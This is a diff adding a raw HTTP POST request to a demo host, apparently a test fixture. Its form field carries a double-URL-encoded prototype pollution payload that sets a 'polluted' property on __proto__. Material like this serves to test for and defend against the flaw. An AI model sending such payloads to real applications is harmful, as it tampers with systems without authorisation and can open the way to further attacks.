@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 83
+Connection: close
+
+path=obj%255B%2522__proto__%2522%255D%255B%2522polluted%2522%255D%253D%2522yes%2522
